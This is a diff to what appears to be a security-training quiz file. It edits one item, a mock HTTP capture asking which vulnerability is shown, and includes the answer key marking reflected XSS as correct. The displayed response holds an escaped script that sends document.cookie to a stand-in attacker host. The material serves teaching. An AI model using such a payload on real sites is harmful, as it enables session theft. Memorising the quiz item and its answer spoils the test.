@@ -1629,15 +1629,16 @@ DATA:
     },
     {
       title: 'CAPTURE 7 — Web Traffic',
-      data: `GET /search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script> HTTP/1.1
+      data: `GET /search?q=[XSS PAYLOAD: fetch cookie → attacker.com] HTTP/1.1
 Host: vulnerable-site.com
 
 HTTP/1.1 200 OK
 Content-Type: text/html
 
-<html><body>
-Results for: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
-</body></html>`,
+&lt;html&gt;&lt;body&gt;
+Results for: &lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;
+  ↑ SERVER REFLECTED THE SCRIPT UNESCAPED — browser executes it
+&lt;/body&gt;&lt;/html&gt;`,
       question: 'What web application vulnerability is demonstrated?',
       options: ['CSRF', 'Reflected XSS (Cross-Site Scripting)', 'SQL Injection', 'XML injection'],
       correct: 1,
